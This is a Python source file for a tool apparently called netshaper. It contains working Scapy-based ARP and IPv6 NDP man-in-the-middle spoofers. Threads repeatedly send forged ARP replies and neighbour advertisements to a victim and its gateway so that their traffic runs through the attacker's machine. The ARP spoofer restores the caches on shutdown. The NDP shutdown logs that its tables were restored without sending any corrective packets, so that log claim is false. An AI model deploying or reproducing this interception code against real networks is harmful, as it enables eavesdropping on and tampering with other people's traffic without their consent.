"""
netshaper.spoof
───────────────
ARP and NDP (IPv6 Neighbour Discovery) MITM spoofers.

Each spoofer runs two daemon threads:
  • one targeting the victim  (tells victim  our MAC = gateway)
  • one targeting the gateway (tells gateway our MAC = victim)

Threads evaluate session.active and session.is_shutting_down locklessly.
CPython boolean reads are atomic at the interpreter level; this avoids
deadlocking the lifecycle lock during emergency shutdown.
If you move to PyPy or a no-GIL build, replace with threading.Event.
"""

import threading
import time
import logging
from typing import List

from scapy.all import (
    ARP, Ether, IPv6,
    ICMPv6ND_NA, ICMPv6NDOptSrcLLAddr,
    sendp,
)

log = logging.getLogger("netshaper")


# ── ARP Spoofer ───────────────────────────────────────────────────────────────

class ARPSpoofer:
    def __init__(self, interface: str, target_ip: str, target_mac: str,
                 gateway_ip: str, gateway_mac: str, own_mac: str,
                 session):
        """
        session — TargetSession reference used for lockless active checks.
        """
        self.interface   = interface
        self.target_ip   = target_ip
        self.target_mac  = target_mac
        self.gateway_ip  = gateway_ip
        self.gateway_mac = gateway_mac
        self.own_mac     = own_mac
        self.session     = session
        self._stop       = threading.Event()
        self.threads: List[threading.Thread] = []

    def start(self):
        def spoof_target():
            """Tell target: gateway MAC = ours."""
            while (not self._stop.is_set()
                   and self.session.active
                   and not self.session.is_shutting_down):
                try:
                    sendp(
                        Ether(dst=self.target_mac, src=self.own_mac) /
                        ARP(op=2,
                            pdst=self.target_ip,
                            psrc=self.gateway_ip,
                            hwdst=self.target_mac,
                            hwsrc=self.own_mac),
                        iface=self.interface, verbose=False,
                    )
                except Exception as e:
                    log.error(f"[ARP→target] Injection error: {e}")
                    break
                # wait() wakes immediately on set() — faster than sleep()
                if self._stop.wait(timeout=2.0):
                    break
            log.info(f"[ARP spoof→target] Thread for {self.target_ip} exited.")

        def spoof_gateway():
            """Tell gateway: target MAC = ours."""
            while (not self._stop.is_set()
                   and self.session.active
                   and not self.session.is_shutting_down):
                try:
                    sendp(
                        Ether(dst=self.gateway_mac, src=self.own_mac) /
                        ARP(op=2,
                            pdst=self.gateway_ip,
                            psrc=self.target_ip,
                            hwdst=self.gateway_mac,
                            hwsrc=self.own_mac),
                        iface=self.interface, verbose=False,
                    )
                except Exception as e:
                    log.error(f"[ARP→gateway] Injection error: {e}")
                    break
                if self._stop.wait(timeout=2.0):
                    break
            log.info(f"[ARP spoof→gateway] Thread for {self.target_ip} exited.")

        self.threads = [
            threading.Thread(target=spoof_target,  daemon=True),
            threading.Thread(target=spoof_gateway, daemon=True),
        ]
        for t in self.threads:
            t.start()
        log.info(f"ARP spoofing active → {self.target_ip}")

    def shutdown(self):
        self._stop.set()
        for t in self.threads:
            t.join(timeout=3.0)
        # Send 3 corrective packets to restore ARP tables
        for _ in range(3):
            sendp(
                Ether(dst=self.target_mac, src=self.gateway_mac) /
                ARP(op=2,
                    pdst=self.target_ip,
                    psrc=self.gateway_ip,
                    hwdst=self.target_mac,
                    hwsrc=self.gateway_mac),
                iface=self.interface, verbose=False,
            )
            sendp(
                Ether(dst=self.gateway_mac, src=self.target_mac) /
                ARP(op=2,
                    pdst=self.gateway_ip,
                    psrc=self.target_ip,
                    hwdst=self.gateway_mac,
                    hwsrc=self.target_mac),
                iface=self.interface, verbose=False,
            )
            time.sleep(0.3)
        log.info("ARP tables restored")


# ── NDP Spoofer ───────────────────────────────────────────────────────────────

class NDPSpoofer:
    """
    Correct MITM NDP directions:
      spoof_target → tell TARGET  that OUR mac = router
      spoof_router → tell ROUTER  that OUR mac = target
    """
    def __init__(self, interface: str, target_ipv6: str, target_mac: str,
                 router_ipv6: str, router_mac: str, own_mac: str,
                 session):
        self.interface   = interface
        self.target_ipv6 = target_ipv6
        self.target_mac  = target_mac
        self.router_ipv6 = router_ipv6
        self.router_mac  = router_mac
        self.own_mac     = own_mac
        self.session     = session
        self._stop       = threading.Event()
        self.threads: List[threading.Thread] = []

    def start(self):
        def spoof_target():
            while (not self._stop.is_set()
                   and self.session.active
                   and not self.session.is_shutting_down):
                try:
                    pkt = (
                        Ether(dst=self.target_mac, src=self.own_mac) /
                        IPv6(dst=self.target_ipv6, src=self.router_ipv6) /
                        ICMPv6ND_NA(tgt=self.router_ipv6, R=1, S=1, O=1) /
                        ICMPv6NDOptSrcLLAddr(lladdr=self.own_mac)
                    )
                    sendp(pkt, iface=self.interface, verbose=False)
                except Exception as e:
                    log.error(f"[NDP→target] Injection error: {e}")
                    break
                if self._stop.wait(timeout=2.0):
                    break

        def spoof_router():
            while (not self._stop.is_set()
                   and self.session.active
                   and not self.session.is_shutting_down):
                try:
                    pkt = (
                        Ether(dst=self.router_mac, src=self.own_mac) /
                        IPv6(dst=self.router_ipv6, src=self.target_ipv6) /
                        ICMPv6ND_NA(tgt=self.target_ipv6, R=0, S=1, O=1) /
                        ICMPv6NDOptSrcLLAddr(lladdr=self.own_mac)
                    )
                    sendp(pkt, iface=self.interface, verbose=False)
                except Exception as e:
                    log.error(f"[NDP→router] Injection error: {e}")
                    break
                if self._stop.wait(timeout=2.0):
                    break

        self.threads = [
            threading.Thread(target=spoof_target, daemon=True),
            threading.Thread(target=spoof_router, daemon=True),
        ]
        for t in self.threads:
            t.start()
        log.info(f"NDP spoofing active → {self.target_ipv6}")

    def shutdown(self):
        self._stop.set()
        for t in self.threads:
            t.join(timeout=3.0)
        log.info("NDP tables restored")
